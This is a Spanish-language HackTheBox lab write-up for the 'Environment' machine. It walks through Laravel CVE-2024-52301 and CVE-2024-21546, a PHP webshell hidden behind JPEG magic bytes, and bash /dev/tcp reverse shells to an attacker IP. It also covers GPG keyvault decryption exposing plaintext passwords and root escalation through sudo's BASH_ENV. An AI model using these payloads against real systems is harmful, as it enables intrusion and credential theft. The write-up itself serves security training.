---
title: Environment - Medium (HTB)
permalink: /Environment-HTB-Writeup/
tags:
  - "Linux"
  - "Medium"
  - "Laravel"
  - "CVE-2024-52301"
  - "Laravel Environment"
  - "CVE-2024-21546"
  - "Code Injection"
  - "GPG"
  - "Sudoers"
  - "BASH_ENV"
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Environment - Medium (HTB)
seo_description: Abusa de vulnerabilidades en Laravel explotando CVEs y Misconfigurations en Sudo para vencer Environment.
excerpt: Abusa de vulnerabilidades en Laravel explotando CVEs y Misconfigurations en Sudo para vencer Environment.
header:
  overlay_image: /assets/images/headers/environment-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/environment-hackthebox.jpg
---


![image-center](/assets/images/posts/environment-hackthebox.png)
{: .align-center}

**Habilidades:** Laravel Environment String Manipulation (CVE-2024-52301), Laravel `filemanager` < 2.9.1 Code Injection (CVE-2024-21546), GPG File Decrypt, Abusing Sudoers Privileges - `$BASH_ENV` [Privilege Escalation]
{: .notice--primary}

# Introducción

Environment es una máquina Linux de dificultad `Medium` en HTB en la que debemos explotar dos CVEs en Laravel para ganar acceso inicial a la máquina (CVE-2024-52301 y CVE-2024-21546). Privilegios a nivel de `sudoers` con directivas inseguras permitirán ganar acceso completo a Environment.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.67
PING 10.10.11.67 (10.10.11.67) 56(124) bytes of data.
64 bytes from 10.10.11.67: icmp_seq=1 ttl=63 time=239 ms

--- 10.10.11.67 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 238.776/238.776/238.776/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos realizando un escaneo que identifique puertos abiertos en la máquina víctima. Primeramente los haremos por el protocolo TCP

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.67 -oG openPorts 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-04 12:08 EDT
Nmap scan report for 10.10.11.67
Host is up (0.18s latency).
Not shown: 59330 closed tcp ports (reset), 6203 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 21.48 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo a los puertos descubiertos con el fin de identificar la versión de los servicios que se ejecutan

~~~ bash
nmap -p 22,80 -sVC 10.10.11.67 -oN services                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-04 12:09 EDT
Nmap scan report for 10.10.11.67
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://environment.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.33 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal


Vemos que existen los servicios `ssh` y `http`, el cual ejecuta un servicio web con `nginx`. Además, el servidor nos intenta redirigir a `environment.htb`, agregaremos este nombre de dominio a nuestro archivo `/etc/hosts` (asegúrate agregarlo con permisos administrativos)

~~~ bash
echo "10.10.11.67 environment.htb" | sudo tee -a /etc/hosts
            
10.10.11.67 environment.htb
~~~


## Web Enumeration

Antes de navegar hasta la web, podemos realizar un escaneo preliminar de las tecnologías web, esto con el fin de identificar algún gestor de contenido

~~~ bash
http://environment.htb [200 OK] Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], HttpOnly[laravel_session], IP[10.10.11.67], Laravel, Script, Title[Save the Environment | environment.htb], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], nginx[1.22.1]
~~~

Vemos algo un tanto interesante, el servidor web muestra el contenido con `Laravel`

> Laravel es un popular framework de PHP de código abierto que simplifica el desarrollo de aplicaciones web al proporcionar una estructura organizada y herramientas predefinidas para tareas comunes como la autenticación, el enrutamiento y la gestión de bases de datos.
{: .notice--info}

Al dirigirnos a `environment.htb` desde el navegador, veremos la siguiente web

![image-center](/assets/images/posts/environment-web-analysis.png)
{: .align-center}

### Fuzzing

Utilizaremos un listado de rutas posibles para realizar solicitudes a posibles endpoints dentro de la web

~~~ bash
gobuster dir -u http://environment.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 5 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://environment.htb/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 2391]
/upload               (Status: 405) [Size: 244852]
/storage              (Status: 301) [Size: 169] [--> http://environment.htb/storage/]
/up                   (Status: 200) [Size: 2125]
/logout               (Status: 302) [Size: 358] [--> http://environment.htb/login]
/vendor               (Status: 301) [Size: 169] [--> http://environment.htb/vendor/]
~~~

Vemos algunas rutas, donde `/upload` arroja un código de estado `405`

> El código de estado HTTP 405 significa `"Method Not Allowed"` (Método no permitido), indicando que el servidor conoce el método de solicitud (como GET, POST, etc.), pero lo rechaza porque no es compatible con el recurso o la URL solicitada.
{: .notice--info}

### Laravel Error Page

En teoría deberíamos probar otros métodos (POST, OPTIONS, etc.), pero primero navegaremos hasta la web para ver si vemos algo más. Nos encontraremos con una página de error de `Laravel`.

> Veremos la versión de Laravel, la cual corresponde a la `11.30.0`
{: .notice--danger}

![image-center](/assets/images/posts/environment-laravel.png)
{: .align-center}

En el código fuente de la web podemos ver el siguiente código `javascript` definido, donde se define la lógica para el endpoint `/mailing`

~~~ js
document.getElementById('mailingListForm').addEventListener('submit', async function (event) {
            event.preventDefault(); // Prevent the default form submission behavior

            const email = document.getElementById('email').value;
            const csrfToken = document.getElementsByName("_token")[0].value;
            const responseMessage = document.getElementById('responseMessage');

            try {
                const response = await fetch('/mailing', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: "email=" + email + "&_token=" + csrfToken,
                });

                if (response.ok) {
                    const data = await response.json();
                    responseMessage.textContent = data.message; // Display success message
                    responseMessage.style.color = 'greenyellow';
                } else {
                    const errorData = await response.json();
                    responseMessage.textContent = errorData.message || 'An error occurred.';
                    responseMessage.style.color = 'red';
                }
            } catch (error) {
                responseMessage.textContent = 'Failed to send the request.';
                responseMessage.style.color = 'red';
            }
        });
~~~

Si intentamos visitar `environment.htb/mailing`, veremos la página de error nuevamente, debido a que esta ruta solo parece aceptar el método POST.

![image-center](/assets/images/posts/environment-laravel-2.png)
{: .align-center}

### Login Page

Si visitamos `/login` podemos ver la siguiente web donde podemos iniciar sesión en una plataforma

![image-center](/assets/images/posts/environment-login.png)
{: .align-center}

Una solicitud HTTP normal a `/login` se ve de la siguiente manera, donde enviamos datos del usuario además del valor `remember`, que hace referencia al `checkbox` que dice `Remember Me?`

~~~ http
POST /login HTTP/1.1
Host: environment.htb
...
...
...

_token=XaljN7xqJVBdRfwQZryzyijD0fCvAjP787kGUtew&email=test%40test.com&password=test123&remember=False
~~~

### Error Forcing

Si manipulamos la solicitud pasándola por un proxy HTTP (como `Burpsuite`) para eliminar algún parámetro o modificarlo, el servidor responde con un código de estado `500 Internal Server Error

> El código de error HTTP `500` (o `"Internal Server Error"`) es un mensaje genérico de HTTP que indica que el servidor web que aloja la página web ha encontrado un problema inesperado y no puede completar la solicitud.
{: .notice--info}

![image-center](/assets/images/posts/environment-burpsuite.png)
{: .align-center}

 Al usar el navegador enviando la misma solicitud, el servidor nos muestra la página de error de `Laravel`

![image-center](/assets/images/posts/environment-laravel-3.png)
{: .align-center}

En este caso estamos ocasionando un error intencionalmente para acceder a esta web e intentar revelar más información acerca del funcionamiento del servidor.

Haciendo diversas pruebas, si enviamos la solicitud con el parámetro `remember` vacío, lograremos ver un poco más del código fuente

~~~ http
POST /login HTTP/1.1
Host: environment.htb
...
...
...

_token=<TOKEN_HERE>&email=test%40test.com&password=holahola123&remember=
~~~

En el código se nos señala la línea `75`, la cual arroja el error, pero si miramos más abajo en la línea `79`, veremos cómo se evalúa una variable de entorno con el valor `preprod`, el cual cambia la lógica de la web.

> `App::environment()` en Laravel es un método que te permite **determinar el entorno actual** en el que se está ejecutando tu aplicación. Laravel utiliza entornos ( como `local`, `production`, `staging`, etc.), definidos en el archivo `.env` mediante la variable `APP_ENV`.
{: .notice--info}

![image-center](/assets/images/posts/environment-laravel-4.png)
{: .align-center}

<br>
# Intrusión / Explotación
---
## Laravel Environment String Manipulation (CVE-2024-52301)

[CVE-2024-52301](https://www.wiz.io/vulnerability-database/cve/cve-2024-52301) es una vulnerabilidad crítica en `Laravel`, la cual consiste en una validación inadecuada de los datos de entrada relacionados con la configuración del entorno de `Laravel`, esto afecta a muchas versiones, desde:

- 6.20.45, 7.0.0-7.30.7, 8.0.0-8.83.28, 9.0.0-9.52.17, 10.0.0-10.48.23, 11.0.0-11.31.0

La versión actual se encuentra en el último rango, por ende es potencialmente vulnerable

### Understanding Vulnerability

Cuando la directiva `register_argc_argv` de PHP se encuentra habilitada, es posible manipular el entorno `Laravel` a través de una solicitud HTTP con parámetros en la URL como `--env`, alterando el entorno de ejecución.

El siguiente fragmento de código disponible en [`Github`](https://github.com/laravel/framework/blob/v11.30.0/src/Illuminate/Foundation/Application.php#L760) contiene la función `detectEnvironment`, la cual detecta el entorno accediendo a `$_SERVER['argv']`, el cual contiene los argumentos de línea de comandos.

~~~ php
public function detectEnvironment (Closure $callback)
{
    $args = $_SERVER['argv'] ?? null;

    return $this['env'] = (new EnvironmentDetector)->detect($callback, $args);
}
~~~

### Exploiting

Enviaremos una solicitud HTTP POST a `/login` pasando el parámetro `--env` con el valor `preprod` (el que vimos en el código)

~~~ http
POST /login?--env=preprod HTTP/1.1
Host: environment.htb
...
...
...

_token=<TOKEN_HERE>=test123%40test.com&password=test123&remember=False
~~~

Desde `Burpsuite`, vemos cómo el servidor procesa la solicitud correctamente y nos intenta redirigir a `/management/dashboard`

![image-center](/assets/images/posts/environment-burpsuite-2.png)
{: .align-center}

Al replicar esta solicitud en el navegador, el servidor nos llevará a un panel de administración

![image-center](/assets/images/posts/environment-dashboard.png)
{: .align-center}


## File Upload Analysis

En la sección `profile` podemos asignar una foto de perfil para el usuario. Al intentar cargar directamente un archivo `.php`, el servidor lo rechaza

![image-center](/assets/images/posts/environment-file-upload.png)
{: .align-center}

Interceptaremos la solicitud con un proxy HTTP (como `Burpsuite`) para poder ver y manipular parámetros. Realizando pruebas cambiando el nombre del parámetro `name`, ocasionaremos un error

![image-center](/assets/images/posts/environment-burpsuite-3.png)
{: .align-center}

Una búsqueda rápida en Google usando las comillas (`""`) nos puede llevar al siguiente [repositorio](https://github.com/UniSharp/laravel-filemanager/)

![image-center](/assets/images/posts/environment-google.png)
{: .align-center}


## Laravel `filemanager` < 2.9.1 Code Injection (CVE-2024-21546)

Haciendo una nueva búsqueda por `"laravel filemanager cve"` encontraremos una vulnerabilidad crítica que afecta al repositorio `UniSharp/laravel-filemanager` en sus versiones anteriores a la `2.9.1`.

La vulnerabilidad se ocasiona cuando el paquete `filemanager` procesa el `mimetype` y la extensión de un archivo como filtro frente a extensiones de archivos PHP.

En la versión [`2.9.0`](https://github.com/UniSharp/laravel-filemanager/blob/v2.9.0/src/LfmUploadValidator.php#L64C5-L74C1) podemos ver cómo solamente se comprobaba el tipo de archivo mediante `getMimeType()`, sin verificar adicionalmente por caracteres especiales

~~~ php
public function mimetypeIsNotExcutable($excutable_mimetypes)
    {
        $mimetype = $this->file->getMimeType();

        if (in_array($mimetype, $excutable_mimetypes)) {
            throw new ExcutableFileException();
        }

        return $this;
    }
~~~

La cadena de validaciones se construía de la [siguiente manera](https://github.com/UniSharp/laravel-filemanager/blob/v2.9.0/src/LfmPath.php#L256) en la función `validateUploadedFile()`

~~~ php
$validator->mimetypeIsNotExcutable(config('lfm.disallowed_mimetypes', ['text/x-php', 'text/html', 'text/plain']));

$validator->extensionIsNotExcutable(config('lfm.disallowed_extensions', ['php', 'html']));
~~~

Es posible eludir estas restricciones utilizando una extensión que termina con un `.`, engañando al sistema para que ejecute código PHP malicioso

~~~ bash
test.jpg.php.
~~~

### Proof of Concept

La siguiente [prueba de concepto](https://github.com/ajdumanhug/CVE-2024-21546/blob/main/CVE-2024-21546.py#L41) sigue la misma lógica de la imagen donde enviamos código PHP posterior a los `Magic Numbers` de una imagen. En mi caso he utilizado una imagen `jpeg`, por lo que los magic numbers son ligeramente diferentes.

La siguiente línea de código forma parte de un [script](https://pastebin.com/raw/KJb0bs6H) en `python3` que construí para replicar la misma lógica.

~~~ python
img_payload = (b"\xFF\xD8\xFF\xE0\x0D\x0A" + "<?php system($_GET['cmd']); ?>".encode())
~~~

> Los "magic numbers" de una imagen (o de cualquier archivo digital) son una secuencia específica de `bytes` que aparece al **comienzo del archivo** y que sirve para identificar su **tipo o formato**.
{: .notice--info}

Podemos agregar la imagen y manualmente agregar el código PHP debajo de los primeros `bytes` del archivo

![image-center](/assets/images/posts/environment-burpsuite-4.png)
{: .align-center}

Iniciaremos un `sniffer` para poder verificar una traza ICMP hacia nuestra IP a modo de prueba

~~~ bash
tcpdump -i tun0 icmp -n
~~~

Ahora usaremos la `webshell` enviando un comando a través del parámetro `cmd`

~~~ bash
curl -s "http://environment.htb/storage/files/test.jpeg.php?cmd=ping%20-c1%2010.10.14.169"
~~~

- `%20`: Codificar un espacio en URL

Recibiremos la traza ICMP en nuestra máquina, esto es lo que esperábamos

~~~ bash
17:27:34.544598 IP 10.10.11.67 > 10.10.14.169: ICMP echo request, id 5228, seq 1, length 64
17:27:34.544620 IP 10.10.14.169 > 10.10.11.67: ICMP echo reply, id 5228, seq 1, length 64
~~~

### Exploiting

Con capacidad de ejecutar comandos remotamente, podemos intentar enviarnos una conexión a nuestra máquina para contar con una consola

> En este caso el comando en `base64` ejecuta una consola de `bash` hacia nuestra IP por el puerto `443`
{: .notice--warning}

~~~ bash
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.169/443 0>&1'" | base64 | sed -s 's/+/%2B/g' 
~~~

- El caracter `+` en solicitudes HTTP se interpreta como un espacio, por lo que debemos especificar su valor en la codificación URL (`%2B`)

Antes de enviar el comando, iniciaremos un listener por el puerto que elegimos anteriormente

~~~ bash
nc -lvnp 443             
listening on [any] 443 ...
~~~

La solicitud que debemos enviar debe decodificar esta cadena y ejecutarla con `bash` (nota cómo usé codificación URL en el parámetro `cmd`)

~~~ bash
curl -s "http://environment.htb/storage/files/test.jpeg.php?cmd=echo%20YmFzaCAtYyAnYmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNjkvNDQzIDA%252BJjEnCg%3D%3D%20%7C%20base64%20-d%20%7C%20bash"
~~~ 


## Shell as `www-data`

A los pocos momentos de ejecutar desde nuestro listener recibiremos una consola como el usuario `www-data`

~~~ bash
connect to [10.10.14.169] from (UNKNOWN) [10.10.11.67] 45320
bash: cannot set terminal process group (896): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.2$ whoami
whoami
www-data
~~~


### TTY Treatment

Haremos un tratamiento de la `tty` para operar con una consola completamente interactiva

~~~ bash
bash-5.2$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
bash-5.2$ ^Z
[1]  + 519707 suspended  nc -lvnp 443
root@parrot content # stty raw -echo;fg      
[1]  + 519707 continued  nc -lvnp 443
                                     reset xterm
~~~

Continuaremos cambiando el valor de la variable de entorno `TERM` para poder limpiar la pantalla con `Ctrl+L`, además de ajustar las proporciones de la ventana a las de nuestra máquina

~~~ bash
bash-5.2$ export TERM=xterm
bash-5.2$ stty rows 44 columns 184
~~~

> Puedes ver tus proporciones con el comando `stty size` desde tu máquina
{: .notice--warning}


## Finding Lateral Movement Path

En este punto nos encontramos dentro de la máquina, pero no contamos con privilegios suficientes para realizar acciones administrativas en el sistema. Comenzaremos una enumeración del sistema para encontrar vías potenciales para escalar privilegios

### Users

Enumeraremos a los usuarios registrados en el sistema, los cuales se pueden ver en el archivo `/etc/hosts`

~~~ bash
bash-5.2$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
hish:x:1000:1000:hish,,,:/home/hish:/bin/bash
~~~

En este caso filtramos por las coincidencias que terminan con `sh`, para filtrar por tipos de shell (`bash`, `sh`, `zsh`, etc.).

### Interesting Files

Si inspeccionamos el directorio `/home`, al parecer tenemos acceso al directorio del usuario `hish` (nota cómo listamos archivos ocultos con la flag `-a`)

~~~ bash
bash-5.2$ ls -la /home/hish
total 40
drwxr-xr-x 5 hish hish 4096 Sep  8 00:53 .
drwxr-xr-x 3 root root 4096 Jan 12  2025 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout
-rw-r--r-- 1 hish hish 3526 Jan 12  2025 .bashrc
drwxr-xr-x 4 hish hish 4096 Sep  8 02:27 .gnupg
drwxr-xr-x 3 hish hish 4096 Jan  6  2025 .local
-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 backup
-rw-r--r-- 1 root hish   33 Sep  8 00:35 user.txt
~~~


## GPG File Decrypt

Dentro del directorio `/home/backup`, encontraremos un archivo `.gpg`, el cual está cifrado mediante `gpg`

> Un archivo `.gpg` es un archivo que ha sido **cifrado o firmado** utilizando GNU Privacy Guard (GPG) o el estándar OpenPGP para proteger su privacidad e integridad.
{: .notice--info}

~~~ bash
bash-5.2$ ls -la /home/hish/backup 
total 12
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 .
drwxr-xr-x 5 hish hish 4096 Sep  8 00:53 ..
-rw-r--r-- 1 hish hish  430 Sep  8 02:28 keyvault.gpg

bash-5.2$ file /home/hish/backup/keyvault.gpg 
backup/keyvault.gpg: PGP RSA encrypted session key - keyid: B755B0ED D6CFCFD3 RSA (Encrypt or Sign) 2048b .
~~~

Los archivos necesarios para `GnuPG` se encuentran dentro del directorio personal del usuario, en este caso dentro de `/home/hish`.

 >El directorio `~/.gnupg` es la ubicación estándar en sistemas Linux donde GNU Privacy Guard (GPG) almacena sus archivos de configuración y las claves privadas y públicas del usuario para cifrado y firma digital.
{: .notice--info}

~~~ bash
bash-5.2$ HOME=/home/hish gpg --list-keys 
gpg: WARNING: unsafe ownership on homedir '/home/hish/.gnupg'
gpg: Note: trustdb not writable
/home/hish/.gnupg/pubring.kbx
-----------------------------
pub   rsa2048 2025-01-11 [SC]
      F45830DFB638E66CD8B752A012F42AE5117FFD8E
uid           [ultimate] hish_ <hish@environment.htb>
sub   rsa2048 2025-01-11 [E]
~~~

Como no somos propietarios del directorio del usuario `hish`, cuando intentemos descifrar el archivo `keyvault.gpg`, obtendremos un conflicto de permisos

> Para descifrar un archivo `.gpg` simplemente podríamos utilizar la flag `-d` o `--decrypt`, esto si fuéramos el propietario del directorio donde se almacenan los archivos de claves que necesita `gpg`.
{: .notice--warning}

~~~ bash
bash-5.2$ gpg --home /home/hish -d /home/hish/backup/keyvault.gpg 
gpg: WARNING: unsafe ownership on homedir '/home/hish'
gpg: failed to create temporary file '/home/hish/.#lk0x00005601c1024170.environment.2694': Permission denied
gpg: keyblock resource '/home/hish/pubring.kbx': Permission denied
gpg: encrypted with RSA key, ID B755B0EDD6CFCFD3
gpg: decryption failed: No secret key
~~~

Para solucionar este problema, podemos simplemente copiar el directorio `.gnupg` a otro donde tengamos permisos de escritura, por ejemplo `/tmp`

~~~ bash
bash-5.2$ cp -r /home/hish/.gnupg/ /tmp/.gnupg
~~~

Ahora podremos usar tanto la flag `--home` como la variable de entorno `HOME` sobre el comando `gpg` para descifrar el archivo `keyvault.gpg`

~~~ bash
bash-5.2$ HOME=/tmp gpg -d /home/hish/backup/keyvault.gpg 
gpg: WARNING: unsafe permissions on homedir '/tmp/.gnupg'
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
~~~

Vemos las credenciales para el usuario `hish`, donde la segunda en teoría corresponde a la máquina (`ENVIRONMENT.HTB -> marineSPm@ster!!`)


## Shell as `hish`

Nos conectaremos proporcionando las credenciales que encontramos

~~~ bash
ssh hish@environment.htb
hish@environment.htb\'s password: 
...
...
...
-bash-5.2$ whoami
hish

~~~

Ya podremos ver la flag el usuario sin privilegios (aunque con `www-data` también podíamos)

~~~ bash
-bash-5.2$ cat user.txt 
4c4...
~~~
<br>


# Escalada de Privilegios
---
## Abusing Sudoers Privileges - `$BASH_ENV`

Al listar privilegios a nivel de `sudoers`, veremos que podemos ejecutar lo que parece ser un binario llamado `systeminfo`

~~~ bash
-bash-5.2$ sudo -l
[sudo] password for hish: 
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
~~~

El contenido del script sería el siguiente, el cual realiza ciertas operatorias con comandos para verificar el estado general del sistema

~~~ bash
-bash-5.2$ cat /usr/bin/systeminfo
#!/bin/bash
echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
dmesg | tail -n 10

echo -e "\n### Checking system-wide open ports ###"
ss -antlp

echo -e "\n### Displaying information about all mounted filesystems ###"
mount | column -t

echo -e "\n### Checking system resource limits ###"
ulimit -a

echo -e "\n### Displaying loaded kernel modules ###"
lsmod | head -n 10

echo -e "\n### Checking disk usage for all filesystems ###"
df -h
~~~

Podemos notar que el propietario es `root`, por lo que si pudiéramos ejecutar comandos a través del script, ya podríamos ejecutar comandos como el usuario `root`

~~~ bash
-bash-5.2$ ls -l /usr/bin/systeminfo
-rwxr-xr-x 1 root root 452 Jan 12  2025 /usr/bin/systeminfo

-bash-5.2$ file /usr/bin/systeminfo
/usr/bin/systeminfo: Bourne-Again shell script, ASCII text executable
~~~

### Understanding Misconfiguration

En la salida del comando `sudo -l`vemos la directiva `env_keep+="ENV BASH_ENV"`, esto permite conservar las variables de entorno cuando ejecutamos un recurso con `sudo`.

> La opción `env_keep` actúa como una lista blanca o `whitelist` para las variables de entorno. Las variables almacenadas en `env_keep` se conservan en el entorno sudo, incluso cuando la opción `env_reset` (que fuerza un entorno limpio) está habilitada." 
{: .notice--info} 

Dentro de esta directiva veremos la variable de entorno `BASH_ENV`, la cual le dice qué archivo ejecutar antes de ejecutar un script, podemos encontrar la definición en [`gnu.org`](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV).

> Si esta variable se establece cuando se invoca Bash para ejecutar un script de shell, su valor se expande y se utiliza como nombre de un archivo de inicio que se lee antes de ejecutar el script. Bash no utiliza `PATH` para buscar el nombre de archivo resultante. 
{: .notice--info}

Cuando Bash se inicia de forma no interactiva, por ejemplo, para ejecutar un script, busca la variable `BASH_ENV` en el entorno

~~~ bash
if [ -n "$BASH_ENV" ]; then . "$BASH_ENV"; fi
~~~ 

> Sabiendo todo esto, podríamos pasar un script en la variable `BASH_ENV` al momento de ejecutar `systeminfo`, de esta forma la variable se conservará y ejecutará nuestro recurso antes
{: .notice--warning} 

### Exploiting

Para continuar, crearemos un nuevo script de `bash` que intente ejecutar un comando, por ejemplo enviar una reverse shell hacia nuestra IP por un puerto. Además debemos asignar permisos de ejecución al recurso

~~~ bash
hish@environment:~$ echo 'bash -i >& /dev/tcp/10.10.14.169/443 0>&1' > /tmp/privesc
hish@environment:~$ chmod +x /tmp/privesc
~~~

Iniciaremos un listener que se encargue de recibir la conexión por el puerto que seleccionamos

~~~ bash
nc -lvnp 443
listening on [any] 443 ...
~~~

Ahora ejecutaremos el script `systeminfo` pasando la variable de entorno antes de ejecutar el comando

~~~ bash
hish@environment:~$ BASH_ENV=/tmp/privesc sudo systeminfo 
~~~

Desde nuestro listener deberíamos recibir de forma inmediata una consola como el usuario `root`

~~~ bash
connect to [10.10.14.169] from (UNKNOWN) [10.10.11.67] 48294
root@environment:/home/hish# id
id
uid=0(root) gid=0(root) groups=0(root)
root@environment:/home/hish# script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
/tmp/privesc: connect: Connection refused
/tmp/privesc: line 1: /dev/tcp/10.10.14.169/443: Connection refused
root@environment:/home/hish# ^Z
[1]  + 282950 suspended  nc -lvnp 443
root@parrot content # stty raw -echo;fg       
[1]  + 282950 continued  nc -lvnp 443
                                     reset xterm
~~~

Ahora ya podremos ver la flag final ubicada en el directorio del usuario `root`

~~~ bash
root@environment:/home/hish# cd
root@environment:~# cat root.txt 
764...
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> The most complicated achievements of thought are possible without the assistance of consciousness.
> — Sigmund Freud
{: .notice--info}
